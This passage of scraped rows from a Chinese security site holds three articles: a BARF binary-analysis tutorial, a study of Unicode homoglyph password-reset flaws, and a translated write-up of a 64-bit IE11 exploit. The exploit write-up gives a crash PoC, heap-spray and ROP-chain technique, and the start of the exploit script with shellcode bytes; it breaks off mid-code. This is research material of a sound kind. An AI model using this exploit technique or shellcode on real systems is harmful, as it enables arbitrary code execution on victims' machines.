，以便在执行代码后再 eax 寄存器获得一个特定的值。首先，我们将指令添加到分析器组件.from barf import BARF# Open ELF filebarf = BARF(""examples/bin/x86/constraint1"")# Add instructions to analyze.for addr, asm_instr, reil_instrs in barf.translate(0x80483ed, 0x8048401):      for reil_instr in reil_instrs:        barf.code_analyzer.add_instruction(reil_instr)然后，我们为每个感兴趣的变量生成表达式。# Get smt expression for eax and ebp registerseap = barf.code_analyzer.get_register_expr(""eax"")  ebp = barf.code_analyzer.get_register_expr(""ebp"")# Get smt expressions for memory locations (each one of 4 bytes)a = barf.code_analyzer.get_memory_expr(ebp-0x8, 4)  b = barf.code_analyzer.get_memory_expr(ebp-0xc, 4)  c = barf.code_analyzer.get_memory_expr(ebp-0x4, 4)  并添加所需的限制。# Set range for variablesbarf.code_analyzer.set_preconditions([a &gt;= 2, a &lt;= 100])  barf.code_analyzer.set_preconditions([b &gt;= 2, b &lt;= 100])# Set desired value for the resultbarf.code_analyzer.set_postcondition(c == 13)  最后，我们检查我们建立的限制是否得到解决。# Check satisfiability.if barf.code_analyzer.check() == 'sat':      print(""SAT!"")    # Get concrete value for expressions.    eax_val = barf.code_analyzer.get_expr_value(eax)    a_val = barf.code_analyzer.get_expr_value(a)    b_val = barf.code_analyzer.get_expr_value(b)    c_val = barf.code_analyzer.get_expr_value(c)    # Print values.    print(""eax : 0x{0:%08x} ({0})"".format(eax_val))    print(""ebp : 0x{0:%08x} ({0})"".format(ebp_val))    print(""  a : 0x{0:%08x} ({0})"".format(a_val))    print(""  b : 0x{0:%08x} ({0})"".format(b_val))    print(""  c : 0x{0:%08x} ({0})"".format(c_val))else:      print(""UNSAT!"")你可以在 examples 目录看到更多的例子。更多相关内容可参考项目的 GitHub","2017-01-04 19:46:24","安全工具","BARF -- 二进制分析及逆向框架","http://nsoad.com/Security-tools/2017-01-04/981.html"
"5ccbfa624f2f0a0a7a69c057","历史上的安全漏洞spotify的漏洞相关资料：https://labs.spotify.com/2013/06/18/creative-usernames/spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任","Kong","历史上的安全漏洞spotify的漏洞相关资料：https://labs.spotify.com/2013/06/18/creative-usernames/spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任意用户的密码。github的漏洞相关资料：https://twitter.com/GitHubSecurity/status/757686530748125184 https://bounty.github.com/researchers/jagracey.html?ljhgithub的邮箱名允许unicode字符，导致可以把找回密码的token发送到攻击者的邮箱。从twitter的讨论来以及自己的测试结果来看提供邮箱服务的产品大部分都是白名单了邮箱的用户名，所以都是不可以使用unicode字符的。测试了网易的企业邮箱和腾讯的企业邮箱，都不可以使用unicode字符。所以只能自己搭一个邮件服务器来测试这个问题。魔法在哪里编码的基础知识、unicode编码和同形字参考资料： http://www.freebuf.com/articles/web/25623.html http://www.irongeek.com/homoglyph-attack-generator.php了解了编码是二进制和字符之间的映射关系之后，可以了解到unicode字符无非也是一种字符而已，只要程序支持，应该不会有任何问题。为什么这个unicode字符在处理过程中变成了另外一个字符，而且是看起来很相似的字符，难道程序也跟人眼看一样，被相同的外表迷惑了。显然程序处理的是二进制的数据，只要二进制不同，无论外表看起来多么一样，程序都应该可以分辨出来。关于unicode同形字的问题，unicode homoglyphs，其实早就有不少讨论。不过大多是利用同形字来迷惑人钓鱼之类。那么机器怎么也会被同形字迷惑呢。github的漏洞描述中是这么写的:a flaw in the way email addresses were being normalized to standard character sets when used to look up accounts during the password recovery flow. 在邮件地址标准化成标准的字符集的时候出现问题。而spoity中对有对详细漏洞的代码分析：可以看到也是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。unicode转ascii参考资料：https://www.peterbe.com/plog/unicode-to-ascii http://savanttools.com/unicode-to-ascii.asp这里才是最有意思的地方，为什么对unicode字符的标准化会导致unicode转变成了对应的同形字。电脑应该是只看二进制，又不是跟人一样，会被同形的字迷惑。通过搜索发现，原来有专门的unicode转ascii函数，对unicode于同形的ascii之间有对应的map。比如github中提到的例子，转成对应的ascii就刚好对的上。漏洞原理漏洞的原理比较有意思，主要的条件是用户的id支持unicode。比如两个ID：mike@example.org vs mıke@example.org 然而在一些业务逻辑中会对用户id做标准化的操作，比如重置密码的时候，mıke@example.org标准化之后变成了mike@example.org，从而重置了mike@example.org的密码。所以关键的条件就是用户识别的ID(包括可以用来登录的邮箱)支持unicode。而在某些业务逻辑中有对unicode字符进行所谓标准化，转换成了对应的ascii。其实假如某些业务逻辑不支持unicode，直接丢掉了那部分unicode，应该也是一样的，目前没有看到类似的案例。导致在这部分业务逻辑中出现了越权的问题。典型的场景就是修改密码，导致可以修改他人的密码。对微信的测试记录实际中的场景比较少，大部分产品都会对用户登录名做白名单限制了。经过一番寻找发现微信的绑定邮箱是支持unicode的，而且是邮箱的用户名和域名部分都支持unicode。当然最后的测试结果是不存在这个漏洞。作为一个典型的测试过程记录一下。搭建支持unicode用户名的邮件服务器使用iredmail方便快速搭建邮件服务器。然后发现iredmail对用户名也是有过滤的。代码在iRedAdmin-0.6.1/libs/iredutils.py 中的is_email方法。修改该方法直接返回True,不检查邮件用户名。####################### Regular expressions.## Email.reEmail = r'''[\w\-][\w\-\.\+\=]*@[\w\-][\w\-\.]*\.[a-zA-Z0-9\-]{2,15}'''# Domain.reDomain = r'''[\w\-][\w\-\.]*\.[a-z0-9\-]{2,15}'''# End Regular expressions.########################################## Pre-defined values of SQL functions.sqlUnixTimestamp = web.sqlliteral('UNIX_TIMESTAMP()')#################### Validators#INVALID_EMAIL_CHARS = '~!#$%^&amp;*()\\/\ '  INVALID_DOMAIN_CHARS = '~!#$%^&amp;*()+\\/\ 'def is_email(s):      #return True 直接返回true，不检查email名称合法性。    s = str(s)    if len(set(s) &amp;amp; set(INVALID_EMAIL_CHARS)) &gt; 0 \       or '.' not in s \       or s.count('@') != 1:        return False    reCompEmail = re.compile(reEmail + '/span&gt;, re.IGNORECASE)    if reCompEmail.match(s):        return True    else:        return False然后发现依然无法收到邮件，发现服务器返回505。拒绝了含有unicode字符的邮箱。采用的解决方式在数据库中插入了一条域名的邮箱，转发到一个正常的邮箱。这样可以接受这个域名所有的邮件。因为iredmail默认开启了SSL，为了调试，查看具体的smtp信息，关闭了SSL，直接明文传。绑定邮箱以及重置密码微信邮箱绑定支持unicode字符的邮箱。 绑定邮箱后，重置密码。正常重置了自己的密码。链接中的email字段是base64编码的。解码出来是含有unicode字符的邮箱。所以微信的重置密码业务逻辑中没有标准化unicode字符这个处理。不存在unicode同形字引起的漏洞。","2016-10-20 15:03:29","Web安全","Unicode同形字引起的安全问题","http://nsoad.com/Article/web/20161020/613.html"
"5ccbfa624f2f0a0a7a69c058","在今年的早些时候微软发布了几个安全奖励计划，其中的一个就是寻找在IE11中的漏洞。我参加了这次活动，并且很快找到了一个内存破坏类漏洞。","Kender","前言在今年的早些时候微软发布了几个安全奖励计划，其中的一个就是寻找在IE11中的漏洞。我参加了这次活动，并且很快找到了一个内存破坏类漏洞。尽管我相信这个漏洞是可以被利用来进行任意代码执行的，但是因为缺少时间我当时并没有写出可以利用的exp。然而，出于对新版本操作系统中全新的浏览器exp编写难度的兴趣，我决定来动手开发一个可用的exp。在这篇文章中，我将首先对这个漏洞进行一个介绍，然后在64位Windows 8.1 Preview版本上开发一个可用的exp。当我尝试开发exp时，我并没有试图去实现一个100％可靠的exp（我的目的是在新的平台下做个试验，而不是要做一个实际的攻击武器）但是，我给自己设置了一些限制，这将使这个练习更具有挑战性：1. 漏洞exp的利用不应依赖于其他插件（所以没有Flash和Java），我想让它工作在默认的安装环境。2. 该漏洞必须能够在64位Windows上的64位IE进程中工作。使用32位IE进程其实是在作弊，因为许多漏洞缓解技术（如堆基址随机化）在32位操作系统和进程上并不生效。此外就是现在64位Windows下的exp比较少。3. 不组合使用其他漏洞（例如为了绕过ASLR而组合使用另一个漏洞）关于利用64位Internet Explorer的一个事先注意事项是：在Windows 8和8.1中，当直接在桌面上运行IE时，IE的主进程是64位的，但是渲染器进程将是32位。如果使用新的接口（指windows8的触摸屏），那么两个进程都会是64位的。这一有趣的选择使得桌面版本的IE不太安全。因此在默认环境中，这里展示的exp实际上是针对IE的触摸屏版本的。为了进行exploit的开发需要强制IE进程在桌面上也使用64位模式，我强制IE使用了单进程模式（TabProcGrowth注册表项）。但是请注意，这里仅供调试使用，如果用于浏览随机页面，它会使IE更不安全，因为它会禁用IE的沙盒模式。漏洞分析能够触发该漏洞的一个简短的poc例程如下所示&lt;script&gt;function bug() { t = document.getElementsByTagName(""table"")[0]; t.parentNode.runtimeStyle.posWidth = """"; t.focus();}&lt;/script&gt;&lt;body onload=bug()&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa这是错误输出：(4a8.440): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:00007ff8`e0c90306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000000a6`e1466168=????????????????0:010&gt; rrax=000000a6d1466170 rbx=000000a6d681c360 rcx=000000000000007frdx=0000000001ffffff rsi=000000a6d5960330 rdi=00000000ffffffffrip=00007ff8e0c90306 rsp=000000a6d61794b0 rbp=000000a6d5943a90r8=0000000000000001  r9=0000000000000008 r10=00000000c0000034r11=000000a6d61794a0 r12=00000000ffffffff r13=00000000ffffffffr14=000000000000000b r15=00000000ffffffffiopl=0         nv up ei pl nz na pe nccs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:00007ff8`e0c90306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000000a6`e1466168=????????????????0:010&gt; kChild-SP          RetAddr           Call Site000000a6`d61794b0 00007ff8`e0e49cc0 MSHTML!Layout::ContainerBox::ContainerBox+0x1e6000000a6`d6179530 00007ff8`e0e554a8 MSHTML!Layout::TableGridBox::TableGridBox+0x38000000a6`d6179590 00007ff8`e0e553c2 MSHTML!Layout::TableGridBoxBuilder::CreateTableGridBoxBuilder+0xd8000000a6`d6179600 00007ff8`e0c8b720 MSHTML!Layout::LayoutBuilder::CreateLayoutBoxBuilder+0x2c9000000a6`d61796c0 00007ff8`e0c8a583 MSHTML!Layout::LayoutBuilderDriver::StartLayout+0x85f000000a6`d61798d0 00007ff8`e0c85bb2 MSHTML!Layout::PageCollection::FormatPage+0x287000000a6`d6179a60 00007ff8`e0c856ae MSHTML!Layout::PageCollection::LayoutPagesCore+0x2aa000000a6`d6179c00 00007ff8`e0c86389 MSHTML!Layout::PageCollection::LayoutPages+0x18e000000a6`d6179c90 00007ff8`e0c8610f MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x251000000a6`d6179db0 00007ff8`e0df85ca MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xd7000000a6`d6179e70 00007ff8`e12d472d MSHTML!CMarkupPageLayout::DoLayout+0x76000000a6`d6179eb0 00007ff8`e0d9de95 MSHTML!CView::EnsureView+0xcde000000a6`d617a270 00007ff8`e0d1c29e MSHTML!CElement::EnsureRecalcNotify+0x135000000a6`d617a310 00007ff8`e1556150 MSHTML!CElement::EnsureRecalcNotify+0x1e000000a6`d617a350 00007ff8`e1555f6b MSHTML!CElement::focusHelperInternal+0x154000000a6`d617a3b0 00007ff8`e19195ee MSHTML!CElement::focus+0x87000000a6`d617a400 00007ff8`e06ed862 MSHTML!CFastDOM::CHTMLElement::Trampoline_focus+0x52000000a6`d617a460 00007ff8`e06f0039 jscript9!amd64_CallFunction+0x82000000a6`d617a4b0 00007ff8`e06ed862 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x154000000a6`d617a550 00007ff8`e06f26ff jscript9!amd64_CallFunction+0x82从上面可以看出，IE进程崩溃在MSHTML!Layout:ContainerBox:ContainerBox函数中，因为试图读取rax + rdx * 8指向的未初始化内存。rax实际上是指向一个CFormatCache对象的内存，而rdx（0x0000000001ffffff）的值是很有趣的。所以我查看了ContainerBox：ContainerBox函数的代码，想看看这个值是从哪里来的，以及如果攻击者控制了rax + 0xffffff8处的内存之后可以做什么。00007ffb`dac00145 83cdff          or      ebp,0FFFFFFFFh...00007ffb`dac0023e 440fb64713      movzx   r8d,byte ptr [rdi+13h]00007ffb`dac00243 410fb6c0        movzx   eax,r8b00007ffb`dac00247 c0e805          shr     al,500007ffb`dac0024a 2401            and     al,100007ffb`dac0024c 0f84048f6200    je      MSHTML!Layout::ContainerBox::ContainerBox+0x562 (00007ffb`db229156)00007ffb`dac00252 440fb76f68      movzx   r13d,word ptr [rdi+68h]...00007ffb`db229156 448bed          mov     r13d,ebp00007ffb`db229159 e9f9709dff      jmp     MSHTML!Layout::ContainerBox::ContainerBox+0x137 (00007ffb`dac00257)...00007ffb`dac002db 410fbffd        movsx   edi,r13w...00007ffb`dac002fb 8bcf            mov     ecx,edi00007ffb`dac002fd 8bd7            mov     edx,edi00007ffb`dac002ff 48c1ea07        shr     rdx,700007ffb`dac00303 83e17f          and     ecx,7Fh00007ffb`dac00306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:0000007a`390257f8=????????????????00007ffb`dac0030a 488d0c49        lea     rcx,[rcx+rcx*2]00007ffb`dac0030e 488d14c8        lea     rdx,[rax+rcx*8]00007ffb`dac00312 8b4cc810        mov     ecx,dword ptr [rax+rcx*8+10h]00007ffb`dac00316 8b420c          mov     eax,dword ptr [rdx+0Ch]00007ffb`dac00319 3bc8            cmp     ecx,eax00007ffb`dac0031b 0f83150d7500    jae     MSHTML!Layout::ContainerBox::ContainerBox+0x750f16 (00007ffb`db351036)00007ffb`dac00321 ffc0            inc     eax00007ffb`dac00323 89420c          mov     dword ptr [rdx+0Ch],eax崩溃时rdx的值是由ebp值经过几次赋值之后得来的，ebp在函数开头部分被初始化为0xFFFFFFFF（注意，ebp/rbp在这里不用作栈指针）。我的假设是，值0xFFFFFFFF（-1）是用作CFormatCache索引变量的初始值的。在稍后的代码中，获取了一个指向CTreeNode对象的指针，然后检查CTreeNode中的标志，如果它被设置，则从CTreeNode对象中复制索引值。然而，如果未设置标志（如PoC中的情况），则使用初始值。值0xFFFFFFFF然后被分成上下两部分（CFormatCache看起来像是一个2个DWORD值的数组）。较高索引（将等于0x1ffffff）的值将乘以8（void *的大小），然后将此偏移量加到rax，并将此内存位置处的内容写回到rax。然后，让索引低位（将为0x7f）的值乘以24（可能是CCharFormat元素的大小），并将该偏移量加到eax，然后将此内存位置的内容写入rdx。最后，这是与利用相关的部分：取出[rdx + 0C]处的数字，自增之后再写回[rdx + 0C]用C++描述会简化一些，相关的代码会是这样的：int cacheIndex = -1;if(treeNode-&gt;flag) {  cacheIndex = treeNode-&gt;cacheIndex;} unsigned int index_hi = cacheIndex, index_lo = cacheIndex;index_hi = index_hi &gt;&gt; 7;index_lo = index_lo &amp; 0x7f;//with sizeof(formatCache[i]) == 8 and sizeof(formatCache[i][j]) == 24formatCache[index_hi][index_lo].some_number++;出于实际利用的目的，情况是这样的：一个指向有效内存（CFormatCache指针）的指针会增加0x0FFFFFF8（256M）的大小，并且相加得到的地址的值会被当作另一个指针来处理。让我们调用地址（CFormatCache地址+0x0FFFFFF8）P1和它指向的指针P2。在P2+0xBF4处的DWORD值将被加1（注意，0xBF4的值是这么来的：0x7F * 3 * 8 + 0x0C）。漏洞利用如果我们是在为一个32位的进程编写一个exp，那么一个直接（但不是很优雅）的方法是利用堆喷射来喷射出一个32位的地址，使得当0xBF4与它相加之后的地址上存在有趣的东西（例如字符串或数组长度）。这个所谓的“有趣的东西”可以通过另一个堆喷射来进行布局。然而这个exp是针对具有全ASLR保护的64位进程编写的，因此我们不知道或者不能够猜测到“有趣”对象的地址。我们当然不会去填充64位进程的地址空间，因为堆基址将被随机化从而使得堆上对象的地址不可预测。堆喷射然而，即使在这种情况下，堆喷射仍然可用于漏洞利用的第一部分。注意，当触发漏洞时，P1会被计算为有效堆地址加0x0FFFFFF8（256M）的值。如果我们进行堆喷，来分配相对于堆基地址的内存。通过喷射大约256M的内存，我们可以将P2设置为任意值。总而言之，尽管64位进程和堆地址随机化中的地址空间明显更大，但是在脆弱的程序对堆基地址+一个大偏移处的内存进行解引用的时候，堆喷射仍然有效。而且这是越界访问漏洞的典型行为，所以很常见。除了这里讨论的这个漏洞之外，以前我写过exp的IE漏洞也有这种表现。尽管在现在的exp中通常避免使用堆喷射，而去使用更可靠的替代方案，但是在256M大小偏移固定的情况下，它是非常可靠的。虽然偏移是固定的，但是对于堆喷射来说这是一个非常合适的值。即不是太大，从而导致内存耗尽，也不是太小，从而造成可靠性的问题。不存在Flash插件但是，不能预测这个“有趣对象”地址的问题仍然存在，因此我们要考虑的问题是，我们要喷射什么？在这里我们用喷射指针的方式来取代喷射具体的值。因为在取p2指针指向的值之前，会先将一个0xBF4大小的偏移量加到P2，所以我们将喷射一些对象的地址，并尝试使这个地址+0xBF4的值指向一些我们感兴趣的东西。那么什么是“我们感兴趣的东西”呢？我第一个尝试的是JavaScript字符串的长度值。虽然我能够覆盖字符串长度值（长度值为qword）的高位dword部分，但出现了一个问题：JavaScript字符串的长度值被视为是32位（bit）的数字。但是注意，64位进程上的大多数指针（包括我们要在堆喷射中使用的）都是qword对齐的，当向这样的指针值加一个0xBF4的偏移量时，我们将在一个以qword进行对齐的内存中指向一个qword的高dword部分。所以我们的目标值是不能以64位或是qword进行对齐的。另一个想法是尝试覆盖地址。但是请注意，触发该漏洞会使地址增加4GB大小（假设地址值是以qword进行对齐的），因为我们增加了高位的dword。为了控制这个地址上的内容，我们将需要进行另一个大约4G大小的堆喷射，这将导致计算机上的内存资源被耗尽。顺便说一下，我运行Windows 8.1虚拟机的计算机只安装了4GB的内存，而分配给虚拟机的只有2GB的内存，所以我决定放弃这个想法，看看有没有可用的替代品。我发现在实际攻击中使用过的几个漏洞exp，是通过覆盖Flash数组（Array）的长度域来利用漏洞的。但是在此次练习中Flash是不允许使用的，所以让我们来看看IE 11中的JavaScript数组。事实证明，有一个有趣的值是正确对齐的。下面显示了一个示例的JavaScript数组对象，并且附有一些字段的解释。注意，实际的数组内容可以被分块储存在多个缓冲区中。offset:0, size:8 vtable ptroffset:0x20, size:4 array lengthoffset:0x28, size:8 pointer to the buffer containing array data[beginning of the first buffer, stored together with the array]offset:0x50, size:4 index of the first element in this bufferoffset:0x54, size:4 number of elements currently in the bufferoffset:0x58, size:4 buffer capacityoffset:0x60, size:8 ptr to the next bufferoffset:0x68, size:varies array data stored in the buffer虽然没有必要了解漏洞利用，但是这里也提供了一个String对象示例，并且附有一些字段的解释。我们将喷射指向JavaScript String对象的指针，使用的方式是创建一个大的javascript数组，其中数组中的每一个元素都将是同一个字符串对象。我们还将采用同样的方式来获得内存对齐，从字符串开始偏移0xBF4大小的地方，就是我们要覆盖的值。你可能想知道为什么我喷射的是字符串指针而不是数组对象指针。这是因为String对象相对来说要小得多（32字节对比128字节），所以通过使多个字符串彼此接近并指向一个特定的字符串，我们可以更好地“瞄准”数组对象内的特定偏移值。当然，如果我们有几个字符串彼此相邻，问题就变成了在堆喷射中该使用哪一个。由于Array对象是String的4倍大小，因此在我们可以覆盖的数组中有四个不同的偏移量。如果是随机选择的话，在正确的情况下（具有概率1/4），我们将能够完全覆盖住我们想要的值。在另一种情况下，我们的覆盖会导致数组后续访问违例的地址从而崩溃。在剩下的两种情况下，我们会覆盖到不重要的值，我们可以通过使用指向不同字符串的指针来重新尝试。因此盲目猜测的成功率是1/4，而尝试/重试方法的成功率将是3/4。一个更好的方法是首先对内存进行对齐，以便将可读的内容放在与堆喷射中使用的String对象的0xBF4偏移处。虽然我观察到这是可行的，但我并没有在漏洞代码中提供具体的实现，而是留给读者作为一个练习。有关可以帮助您实现此类对齐的信息，请参阅下一节。在提供的漏洞代码中，使用的是一个简单（半）盲目的方法，其中有一个大的字符串数组（strarr），并且有一个固定索引的字符串用于堆喷。我注意到，这在我使用一个新的进程或选项卡打开PoC（所以在当前进程中我并没有布置其它javascript对象）时可以可靠地工作。如果我使用的索引值不适合你的环境，你可能需要选择一个不同的值或换一个方法。Javascript中的堆风水在继续研究漏洞exp之前，让我们先花一些时间来研究如何在IE11中进行堆喷射，并且在堆上获得具有较高可靠性的对象。第一点，堆喷射虽然微软已经采取措施使得用Javascript字符串喷射堆变得很困难，但是在IE11中Javascript数组似乎并不受这些影响。我们可以通过指针或是绝对值两种方式来进行喷射，例如创建一个大的整数数组。虽然最近有很多IE漏洞exp是使用Flash进行堆喷射的，但是这么做没有必要。考虑到现在的Javascript Array的分配速度很快，Javascript数组可能是未来在IE浏览器中进行堆喷射的首选。第二点，对象在堆上的对齐虽然在Windows 8以上版本（低碎片堆）的默认堆的实现中包含了几个缓解措施如页面保护和分配顺序随机化，这使得获得所需的对齐更加困难。但是在IE11中基本的JavaScript对象（例如Array对象和String对象）使用的是没有这些功能的自定义堆。我接下来会描述我观察到的这个JavaScript堆的具体实现。请注意，以下所有内容都是基于对行为的观察，而不是通过逆向工程代码，因此我可能会做出一些错误的结论，但在exp中它确实是这样工作的。JavaScript对象的空间以0x20000字节的块为单位进行分配。如果需要更多的空间，将分配额外的块，并且没有什么可以阻止这些块彼此相邻（因此，一个块中的溢出理论上可以写入到另一个块中）。这些块进一步划分为0x1000字节的bins（至少对于小对象）。一个bin只保存相同大小和类型的对象。例如，在这个exploit中，我们分别有32和128字节的String和Array对象，一些bin只保存String对象（最多128个对象），而其中一些只保存Array对象（最多32个对象）。当一个bin被完全使用时，它只包含用户数据，而没有元数据。我还观察到对象本身存储在单独的0x20000大小的块中，并且与用户提供的内容是分开的，因此字符串和数组数据将存储在与相应的String和Array对象不同的块中，除非数据足够小才会与对象一起存储（例如，单字符字符串，小数组，如漏洞中的5元素）。给定的bin内的对象分配顺序是顺序的。这意味着，如果我们连续创建三个String对象，并且假设在任何一个bin中没有空洞，它们将彼此相邻，第一个对象位于最低地址，后面紧跟着第二个。一些小技巧所以在这一点上，我们可以增加JavaScript数组中元素的数量。在实际操作中，我们将多次触发漏洞（在提供的exp中为5次，每次触发漏洞会将此数字加3）来使它增大。不幸的是，增加元素的数量不允许我们写数据超过缓冲区的结尾，但它允许我们读取超过结尾数据，这一点就已经足够让我们绕过ASLR了，并且可以泄漏出我们要覆盖的Array对象的精确地址。在知道了Array对象的地址之后，我们就可以进行反复的堆喷射，但是这次，我们将使用精确值进行喷射（我使用整数数组来喷射准确的值）。我们要喷射的值将是一个数组的缓冲区地址减去0xBF1。这意味着喷射值+ 0xBF4将是此块缓冲区中capacity域（表示缓冲区尺寸）的最高字节的地址。在capacity域被覆盖之后，我们就能够向JS Array缓冲区的末尾之后读取或写入数据。在这里，我们很容易地得到了构成现代浏览器漏洞利用的两个重要元素：任意内存地址读和劫持并控制RIP。任意内存地址读：我们可以通过找到Array后面的一个紧邻的String对象的内存，然后覆盖这个对象的缓冲区指针域和大小域来实现读取任意内存（如果我们想要读取更多的数据）。控制RIP：我们可以通过覆盖附近Array对象的虚函数表（vtable）指针并调用虚函数来控制RIP。虽然IE10为mshtml.dll中的一些类引入了虚函数表保护（vtguard），但jscript9.dll中并没有使用这样的保护。然而，请注意，在拥有了内存泄漏的情况下，即使存在vtguard保护，那也只是一个小问题。编写64位exp通过控制RIP和内存泄漏，我们将构建一个ROP链，以便击败DEP。由于我们不能控制堆栈，我们需要做的第一件事是寻找堆栈翻转（pivot）的gadgets。所以，拥有了任意内存泄漏的我们应该能够很容易的在一些可执行模块中搜索到xchg rax，rsp; ret;吧？好吧，并没有这么简单。事实告诉我们，在x64中，堆栈翻转的gadgets比x86代码中要少得多。 在x86中，xchg eax，esp;ret;将只有2个字节的大小，所以会有很多非预期的序列（即本身不是这两条指令，但是两个字节凑在一起恰好形成了这个指令）。在x64中xchg rax，rsp;是3个字节，这使它更不常见。我没有能够在mshtml.dll和jscript9.dll中找到它（或任何其他的“干净的”堆栈翻转gadgets，因此我不得不寻找一些替代品）在研究了一下mshtml.dll后，我发现了一个可用的gadgets序列如下所示，它不是很干净，但假设rax和rcx都指向一个可读的内存，这就是现在的情况。00007ffb`265ea973 50              push    rax00007ffb`265ea974 5c              pop     rsp00007ffb`265ea975 85d2            test    edx,edx00007ffb`265ea977 7408            je      MSHTML!CTableLayout::GetLastRow+0x25 (00007ffb`265ea981)00007ffb`265ea979 8b4058          mov     eax,dword ptr [rax+58h]00007ffb`265ea97c ffc8            dec     eax00007ffb`265ea97e 03c2            add     eax,edx00007ffb`265ea980 c3              ret00007ffb`265ea981 8b8184010000    mov     eax,dword ptr [rcx+184h]00007ffb`265ea987 ffc8            dec     eax00007ffb`265ea989 c3              ret注意，虽然在序列中存在条件跳转，但是两个分支都以RET结束，所以并不会导致崩溃，因此它们都可以达到我们的目的。虽然漏洞利用主要依赖于jscript9.dll中的对象，但是mshtml.dll模块的地址可以很容易地通过内存泄漏来获得。我们可以把一个mshtml对象放入到一个JS数组对象中去，然后我们可以读取到mshtml对象的虚表并且引用它。在获得了栈的控制之后，我们可以调用VirtualProtect来分配一块内存，这块内存可以允许我们写入代码并进行执行。我们可以通过mshtml.dll的IAT找到VirtualProtect函数的地址（因此exp中要包含一些基本的PE结构的解析）。所以，在获得了VirtualProtect函数的地址和控制了堆栈的情况下，我们就可以把正确的参数放在堆栈上并返回调用VirtualProtect函数了，对吧？好吧，还是没有。因为在64位Windows中，使用的调用约定是与32位不同的。64位Windows使用fastcall约定，前4个参数（这正是VirtualProtect的参数数量）通过寄存器RCX，RDX，R8和R9（按此顺序）来传递。因此，我们需要一些额外的gadgets来将正确的参数加载到正确的寄存器中：pop rcx; ret;pop rdx; ret;pop r8; ret;pop r9; ret;如上所示，前三个参数在mshtml.dll模块中是比较常见的。但是第四个不是很常见，不过对于VirtualProtect来说，最后一个参数只需要指向一个可写内存的即可，而在我们获得对RIP控制的时候就已经是这种情况了，所以我们实际上不需要更改r9。最终的ROP链看起来像是这样：address of pop rcx; ret;address on the heap block with shellcodeaddress of pop rdx; ret;0x1000 (size of the memory that we want to make executable)address of pop r8; ret;0x40 (PAGE_EXECUTE_READWRITE)address of VirtualProtectaddress of shellcode所以，我们现在终于可以在64位的Windows 7和8执行一些x64的shellcode，比如像SkyLined的x64 calc shellcode那样的，对不对？好吧，还是没有。Shellcode作者通常相对于兼容性来说要更注重尺寸，并且节省空间的手段往往依赖于当前操作系统版本特性，这使得它很难运行在以后的操作系统版本上。例如，出于兼容性原因，Windows7和8存储PEB，模块信息结构以及地址低于2G的ntdll和kernel32模块。但是这在Windows 8.1预览版中不再成立。此外，虽然Windows x64 fastcall调用约定需要在堆栈上留下32字节的影子空间以调用函数，但是SkyLined的win64-exec-calc-shellcode在调用WinExec之前只需要空余出8个字节。虽然这个shellcode可以在Windows7和Windows8上工作，但是在Windows 8.1预览版上这将导致存储在栈上的字符串（“calc”）被覆盖，因为它被存储在了WinExec的阴影空间中。为了解决这些兼容性问题，我对shellcode进行了修改，并且使用在我提供的exp中。它现在应该可以在Windows 8.1上正常工作了。就像图片展示的这样，最后我们可以成功执行shellcode，从而证明了可以进行任意代码执行。因为IE只有在触摸屏模式下是完全64位的，我没有一个漂亮的Windows计算器的屏幕截图（计算显示在桌面上）。但我确实有一个IE强制载入64位进程的桌面屏幕截图。完整的漏洞利用代码可以在本文的末尾找到。结论虽然Windows8/8.1包含了令人印象深刻的漏洞缓解措施，但是内存破坏类漏洞仍然存活着并且可以被利用。很明显，一些漏洞类型可能变得更加难以利用，但是这里讲的这个漏洞是我发现的第一个IE11的漏洞，可能有更多的漏洞可以以类似的方式被利用。该漏洞还表明，在某些情况下，即使在64位进程中堆喷射仍然有用。虽然在一些情况下，编写在x64上的漏洞利用比在x86上更加困难（例如要找到进行喷射的内容和要覆写的东西，查找堆栈翻转的gadgets等），但这些困难并不足以阻止一个目的明确的攻击者。最后，基于我所知道的一些东西，我列出了一些可以使在Windows 8.1的IE11中编写exp更困难的保护方法：考虑到攻击者使用JavaScript数组来突破堆喷射保护，可以对包含大量重复值的数组进行RLE编码。对JavaScript堆添加与默认堆相同的保护，如添加页保护（guard pages）并引入地址随机化。对常见的JavaScript对象的虚函数表进行保护。对编译器进行更改以从代码中删除所有的可用的堆栈翻转gadgets。其实现在这些gadgets在x64代码中已经很少了，所以不会对性能有很大的影响。exp 代码&lt;script&gt; var magic = 25001; //if the exploit doesn't work for you try selecting another number in the range 25000 -/+ 128 var strarr = new Array(); var arrarr = new Array(); var sprayarr = new Array(); var numsploits; var addrhi,addrlo; var arrindex = -1; var strindex = -1; var strobjidx = -1; var mshtmllo,mshtmlhi; //calc shellcode, based on SkyLined's x64 calc shellcode, but fixed to work on win 8.1 var shellcode = [0x40, 0x80, 0xe4, 0xf8, 0x6a, 0x60, 0x59, 0x65, 0x48, 0x8b, 0x31, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x4f, 0x3c, 0x8b, 0x5c, 0x0f, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x4c, 0x1f, 0x24, 0x48, 0x01, 0xf9, 0x31, 0xd2, 0x0f, 0xb7, 0x2c, 0x51, 0xff, 0xc2, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xf0, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x31, 0xd2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd7, 0xcc, 0, 0, 0, 0];//triggers the 